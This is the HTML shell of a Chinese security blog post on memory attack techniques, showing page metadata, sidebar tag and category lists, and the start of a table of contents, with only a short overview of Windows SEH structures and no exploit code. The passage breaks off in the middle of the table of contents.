<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>形形色色的内存攻击技术 | 技术栈</title><meta name="description" content="[toc]  狙击 Windows 异常处理机制  S.E.H 概述 S.E.H 即异常处理结构体（Structure Exception Handler)，它包含两个DWORD指针：S.E.H链表指针和异常处理函数句柄。   S.E.H 初步了解 S.E.H 链表：  **设计思路：**在系统关闭程序前，给程序一个执行预先设定的回调函数的机会 工作原理： （ 1） S.E.H 结构体存放在系统栈"><meta property="og:type" content="article"><meta property="og:title" content="形形色色的内存攻击技术"><meta property="og:url" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/index.html"><meta property="og:site_name" content="技术栈"><meta property="og:description" content="[toc]  狙击 Windows 异常处理机制  S.E.H 概述 S.E.H 即异常处理结构体（Structure Exception Handler)，它包含两个DWORD指针：S.E.H链表指针和异常处理函数句柄。   S.E.H 初步了解 S.E.H 链表：  **设计思路：**在系统关闭程序前，给程序一个执行预先设定的回调函数的机会 工作原理： （ 1） S.E.H 结构体存放在系统栈"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418093731897.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418095153126.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418111708935.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418112245646.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418112754437.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418122923348.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418212828226.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418220922950.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418214132858.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418214323855.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419141859603.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419143637686.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220421223548497.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220421231555943.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423170845384.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419215423173.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419215625216.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419221608706.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220420100115219.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220420104319811.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423205602972.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423210203879.png"><meta property="article:published_time" content="2022-04-23T13:09:12.000Z"><meta property="article:modified_time" content="2022-08-01T11:15:51.387Z"><meta property="article:author" content="rgzzplus"><meta property="article:tag" content="内存攻击"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418093731897.png"><link rel="canonical" href="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/index.html"><link rel="alternate" href="/atom.xml" title="技术栈" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.css"><meta name="generator" content="Hexo 6.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/rgzz-zq" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">人工智障plus</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Wuhan, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">首页</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">归档</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">分类</span></a></li><li class="menu-item menu-item-repository"><a href="/repository"><i class="icon icon-project"></i> <span class="menu-title">项目</span></a></li><li class="menu-item menu-item-links"><a href="/links"><i class="icon icon-friendship"></i> <span class="menu-title">友链</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">关于</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">公告</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎来到技术栈！</p></div></div></div></div><div class="widget"><h3 class="widget-title">分类</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA/">个人</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/">经验交流</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/">题库/作业</a><span class="category-list-count">2</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASLR/" rel="tag">ASLR</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E5%92%8C%E6%8C%87%E9%92%88/" rel="tag">C和指针</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEP/" rel="tag">DEP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GS/" rel="tag">GS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/" rel="tag">Git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HeapSpary/" rel="tag">HeapSpary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LNMP/" rel="tag">LNMP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" rel="tag">Linux保护机制</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" rel="tag">Linux常用命令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/" rel="tag">Linux汇编伪指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEHOP/" rel="tag">SEHOP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SafeSEH/" rel="tag">SafeSEH</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gdb/" rel="tag">gdb</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/" rel="tag">linux命令行大全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E9%97%AE%E9%A2%98/" rel="tag">linux问题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ollydebug/" rel="tag">ollydebug</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/task-struct/" rel="tag">task_struct</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/typora/" rel="tag">typora</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/" rel="tag">中国知网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%92%E6%96%A5%E9%94%81/" rel="tag">互斥锁</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" rel="tag">信号量</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/" rel="tag">其它类型的漏洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/" rel="tag">内存大小端</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" rel="tag">内存攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" rel="tag">函数指针</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/" rel="tag">同步互斥</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B1%8F%E9%9A%9C/" rel="tag">屏障</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BB%BA%E7%AB%99/" rel="tag">建站</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E8%B7%AF/" rel="tag">心路</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" rel="tag">整数安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E8%B0%88/" rel="tag">杂谈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/" rel="tag">条件变量</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88/" rel="tag">栈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag">格式化字符串</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="tag">正则表达式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" rel="tag">汇编指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E6%97%8B%E9%94%81/" rel="tag">自旋锁</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%BB%E5%86%99%E9%94%81/" rel="tag">读写锁</a><span class="tag-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签云</h3><div class="widget-body tagcloud"><a href="/tags/ASLR/" style="font-size:13px">ASLR</a> <a href="/tags/C/" style="font-size:13px">C++</a> <a href="/tags/C%E5%92%8C%E6%8C%87%E9%92%88/" style="font-size:13.33px">C和指针</a> <a href="/tags/DEP/" style="font-size:13px">DEP</a> <a href="/tags/GS/" style="font-size:13px">GS</a> <a href="/tags/Git/" style="font-size:13px">Git</a> <a href="/tags/HeapSpary/" style="font-size:13px">HeapSpary</a> <a href="/tags/LNMP/" style="font-size:13px">LNMP</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" style="font-size:13px">Linux保护机制</a> <a href="/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" style="font-size:13px">Linux常用命令</a> <a href="/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/" style="font-size:13px">Linux汇编伪指令</a> <a href="/tags/SEHOP/" style="font-size:13px">SEHOP</a> <a href="/tags/SafeSEH/" style="font-size:13px">SafeSEH</a> <a href="/tags/c/" style="font-size:13px">c</a> <a href="/tags/gdb/" style="font-size:13.67px">gdb</a> <a href="/tags/hexo/" style="font-size:13.33px">hexo</a> <a href="/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/" style="font-size:13px">linux命令行大全</a> <a href="/tags/linux%E9%97%AE%E9%A2%98/" style="font-size:13px">linux问题</a> <a href="/tags/ollydebug/" style="font-size:13px">ollydebug</a> <a href="/tags/pwn/" style="font-size:13px">pwn</a> <a href="/tags/reverse/" style="font-size:13.33px">reverse</a> <a href="/tags/shellcode/" style="font-size:13.33px">shellcode</a> <a href="/tags/task-struct/" style="font-size:13px">task_struct</a> <a href="/tags/typora/" style="font-size:13px">typora</a> <a href="/tags/ubuntu/" style="font-size:13.67px">ubuntu</a> <a href="/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/" style="font-size:13px">中国知网</a> <a href="/tags/%E4%BA%92%E6%96%A5%E9%94%81/" style="font-size:13px">互斥锁</a> <a href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" style="font-size:13px">信号量</a> <a href="/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/" style="font-size:13px">其它类型的漏洞</a> <a href="/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/" style="font-size:13px">内存大小端</a> <a href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" style="font-size:13px">内存攻击</a> <a href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" style="font-size:13px">函数指针</a> <a href="/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/" style="font-size:13px">同步互斥</a> <a href="/tags/%E5%A0%86/" style="font-size:13.67px">堆</a> <a href="/tags/%E5%B1%8F%E9%9A%9C/" style="font-size:13px">屏障</a> <a href="/tags/%E5%BB%BA%E7%AB%99/" style="font-size:13px">建站</a> <a href="/tags/%E5%BF%83%E8%B7%AF/" style="font-size:13px">心路</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size:13.33px">攻防世界</a> <a href="/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" style="font-size:13px">整数安全</a> <a href="/tags/%E6%9D%82%E8%B0%88/" style="font-size:13px">杂谈</a> <a href="/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/" style="font-size:13px">条件变量</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size:13px">栈溢出</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size:13px">正则表达式</a> <a href="/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" style="font-size:13px">汇编指令</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size:14px">漏洞</a> <a href="/tags/%E8%87%AA%E6%97%8B%E9%94%81/" style="font-size:13px">自旋锁</a> <a href="/tags/%E8%AF%BB%E5%86%99%E9%94%81/" style="font-size:13px">读写锁</a></div></div><div class="widget"><h3 class="widget-title">归档</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">16</span></li></ul></div></div><div class="widget"><h3 class="widget-title">最新文章</h3><div class="widget-body"><ul class="recent-post-list list-unstyled"><li><div class="item-thumb"><a href="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" class="title">整数安全</a></p><p class="item-date"><time datetime="2022-08-27T04:48:59.000Z" itemprop="datePublished">2022-08-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/" class="title">栈溢出x86_64</a></p><p class="item-date"><time datetime="2022-08-27T04:45:51.000Z" itemprop="datePublished">2022-08-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/" class="title">格式化字符串x86_64</a></p><p class="item-date"><time datetime="2022-08-27T04:45:33.000Z" itemprop="datePublished">2022-08-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/" class="title">Linux_shellcode开发之实战</a></p><p class="item-date"><time datetime="2022-08-08T14:39:50.000Z" itemprop="datePublished">2022-08-08</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a></p><p class="item-title"><a href="/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/" class="title">gdb显示intel和at&amp;t汇编</a></p><p class="item-date"><time datetime="2022-08-08T14:36:22.000Z" itemprop="datePublished">2022-08-08</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse in" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8B%99%E5%87%BB-windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">狙击 Windows 异常处理机制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#seh-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">S.E.H 概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#seh-%E5%88%9D%E6%AD%A5%E4%BA%86%E8%A7%A3"><span 